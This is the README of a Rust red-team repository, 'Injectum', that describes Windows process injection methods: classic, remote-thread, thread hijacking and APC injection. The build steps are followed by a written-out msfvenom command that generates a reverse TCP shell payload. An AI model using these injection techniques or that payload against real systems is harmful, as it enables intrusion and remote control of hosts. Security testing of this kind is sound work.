# Injectum
*Advanced Rust examples of process injection techniques for offensive security and red teaming.*

**Injectum** is a Rust workspace demonstrating real-world process injection methods. The code shows how untrusted payloads can be injected and executed inside the memory of a running process, inheriting its privileges and context. These techniques are commonly used in red team operations to test defenses, bypass protections, and evaluate endpoint security controls.

The workspace includes examples covering the core steps of process injection:
1. Allocate a writable and executable region of memory in a target process.
2. Copy the payload into that memory region.
3. Trigger execution, typically via thread creation or hijacking.

This repository is intended to showcase practical red team capabilities in a controlled and safe environment.

## Crates

| Crate | Description |
|-------|------------|
| [injectum_classic](injectum_classic/README.md) | Classic injection using `VirtualAlloc` and `CreateThread`. |
| [injectum_classic_remote](injectum_classic_remote/README.md) | Remote process injection targeting a PID with `OpenProcess` and `CreateRemoteThread`. |
| [injectum_thread_hijacking](injectum_thread_hijacking/README.md) | Hijacks a thread by modifying its context before resuming execution. |
| [injectum_async_procedure_calls](injectum_async_procedure_calls/README.md) | Queues a payload via an APC on an existing thread in alertable state. |

## Getting Started

Clone the repository:

```bash
git clone https://github.com/0x536b796ec3b578/injectum.git
cd injectum
```

Build and run a specific example (replace example_name with the crate you want to run):
```bash
cargo build --package example_name --release
```

## Generating Shellcode with `msfvenom`

Some of the examples in this workspace require shellcode. You can generate Rust-compatible shellcode using **Metasploit’s `msfvenom`**. For example, to create a 64-bit Windows reverse TCP shell:  

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f rust
```
